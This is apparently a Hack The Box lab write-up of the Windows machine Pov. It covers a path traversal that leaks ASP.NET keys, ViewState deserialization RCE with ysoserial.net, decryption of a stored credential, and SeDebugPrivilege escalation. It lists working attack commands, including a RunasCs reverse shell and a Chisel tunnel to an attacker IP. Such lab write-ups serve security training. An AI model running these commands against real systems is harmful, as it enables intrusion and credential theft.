---
title: HTB Pov
slug: pov
lang: en
platform: Hack The Box
category: ASP.NET Exploitation
headline: Path traversal to ViewState RCE, DPAPI credential recovery and SeDebugPrivilege abuse
difficulty: Retired
objective: Root / Administrator
date: 2025-11-11
tags: [Windows, ASP.NET, ViewState, DPAPI, SeDebugPrivilege]
---

# HTB Pov

## Executive Summary

Pov starts with an ASP.NET download endpoint that strips only a literal `../` sequence. Bypassing that weak filter exposes source code and `web.config`, including the keys required to forge ViewState payloads.

## Initial Access

With the validation and decryption keys from `web.config`, `ysoserial.net` generates a malicious ViewState payload. Replacing the `__VIEWSTATE` value in the vulnerable request confirms command execution and then returns a reverse shell.

## Credential Recovery

The first shell reveals a PowerShell CLIXML credential file. Importing it under the same user context decrypts the stored password, allowing commands to be launched as `alaading` with RunasCs.

## Privilege Escalation

After tunneling WinRM with Chisel, the `alaading` session exposes `SeDebugPrivilege`. A parent-process impersonation technique using a privileged process such as `winlogon.exe` is used to spawn a SYSTEM shell.

## Key Commands

```bash
ysoserial.exe -p ViewState -g TextFormattingRunProperties --path="/portfolio" --apppath="/" --decryptionalg="AES" --validationalg="SHA1" -c "ping 10.10.16.47"
```

```bash
$Credential = Import-Clixml -Path .\connection.xml
```

```bash
.\RunasCs.exe alaading <redacted-password> powershell.exe -r 10.10.16.47:443
```

```bash
.\chisel.exe client 10.10.16.47:1234 R:5985:127.0.0.1:5985
```

```bash
evil-winrm -i 127.0.0.1 -u alaading -p <redacted-password>
```

```bash
Import-Module .\psgetsys.ps1
```

## Evidence Trail

The following screenshots preserve the original lab evidence sequence from the Obsidian notes.

![[Pasted image 20251111170330.png|pov evidence 01]]

![[Pasted image 20251111170554.png|pov evidence 02]]

![[Pasted image 20251111182533.png|pov evidence 03]]

![[Pasted image 20251111182704.png|pov evidence 04]]

![[Pasted image 20251111185044.png|pov evidence 05]]

![[Pasted image 20251111185857.png|pov evidence 06]]

![[Pasted image 20251111190333.png|pov evidence 07]]

![[Pasted image 20251111190503.png|pov evidence 08]]

![[Pasted image 20251111191333.png|pov evidence 09]]

![[Pasted image 20251111194618.png|pov evidence 10]]

![[Pasted image 20251111195032.png|pov evidence 11]]

![[Pasted image 20251111200129.png|pov evidence 12]]

![[Pasted image 20251111201242.png|pov evidence 13]]

![[Pasted image 20251111201315.png|pov evidence 14]]

![[Pasted image 20251111201715.png|pov evidence 15]]

![[Pasted image 20251111202422.png|pov evidence 16]]

![[Pasted image 20251111202523.png|pov evidence 17]]

![[Pasted image 20251111202920.png|pov evidence 18]]

![[Pasted image 20251111203325.png|pov evidence 19]]

![[Pasted image 20251111203518.png|pov evidence 20]]

![[Pasted image 20251111204150.png|pov evidence 21]]

![[Pasted image 20251111205445.png|pov evidence 22]]

![[Pasted image 20251111210045.png|pov evidence 23]]

![[Pasted image 20251111210836.png|pov evidence 24]]

![[Pasted image 20251111210954.png|pov evidence 25]]

![[Pasted image 20251111211152.png|pov evidence 26]]

![[Pasted image 20251111213024.png|pov evidence 27]]

![[Pasted image 20251111213545.png|pov evidence 28]]

![[Pasted image 20251111214205.png|pov evidence 29]]

![[Pasted image 20251111215037.png|pov evidence 30]]

![[Pasted image 20251111215224.png|pov evidence 31]]

![[Pasted image 20251111215516.png|pov evidence 32]]

![[Pasted image 20251111220252.png|pov evidence 33]]

![[Pasted image 20251111220917.png|pov evidence 34]]

![[Pasted image 20251111221208.png|pov evidence 35]]

![[Pasted image 20251111221307.png|pov evidence 36]]

![[Pasted image 20251111221507.png|pov evidence 37]]

![[Pasted image 20251111221732.png|pov evidence 38]]

![[Pasted image 20251111222141.png|pov evidence 39]]

![[Pasted image 20251111222507.png|pov evidence 40]]

![[Pasted image 20251111222556.png|pov evidence 41]]
